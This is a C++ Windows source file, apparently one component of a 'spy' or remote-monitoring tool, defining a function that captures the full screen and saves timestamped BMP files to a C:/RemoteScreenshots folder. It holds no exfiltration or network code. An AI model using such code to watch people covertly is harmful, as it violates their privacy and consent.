#include "SpyFunctions.h"
#include <windows.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <vector>
#include <chrono>
#include <iomanip>
#include <sstream>

void SaveScreenToFile() {
    try {
        int screenX = GetSystemMetrics(SM_CXSCREEN);
        int screenY = GetSystemMetrics(SM_CYSCREEN);

        HDC hScreenDC = GetDC(nullptr);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenX, screenY);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

        BitBlt(hMemoryDC, 0, 0, screenX, screenY, hScreenDC, 0, 0, SRCCOPY);
        SelectObject(hMemoryDC, hOldBitmap);

        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);

        BITMAPFILEHEADER bmfHeader = {};
        BITMAPINFOHEADER bi = {};
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = -bmp.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;

        DWORD imageSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
        std::vector<BYTE> pixels(imageSize);

        GetDIBits(hMemoryDC, hBitmap, 0, bmp.bmHeight, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        auto now = std::chrono::system_clock::now();
        std::time_t now_c = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &now_c);

        std::ostringstream filenameStream;
        filenameStream << "C:/RemoteScreenshots/";
        filenameStream << std::put_time(&tm, "%Y-%m-%d_%H-%M-%S") << ".bmp";
        std::string fullPath = filenameStream.str();

        std::filesystem::create_directories("C:/RemoteScreenshots");
        std::ofstream file(fullPath, std::ios::out | std::ios::binary);
        if (!file) throw std::runtime_error("Cannot open file");

        bmfHeader.bfType = 0x4D42;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = bmfHeader.bfOffBits + imageSize;

        file.write((char*)&bmfHeader, sizeof(bmfHeader));
        file.write((char*)&bi, sizeof(bi));
        file.write((char*)pixels.data(), imageSize);
        file.close();

        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);

        std::cout << "Screen saved to: " << fullPath << std::endl;
    }
    catch (const std::exception& e) {
        OutputDebugStringA(("Screenshot BMP error: " + std::string(e.what()) + "\n").c_str());
    }
}
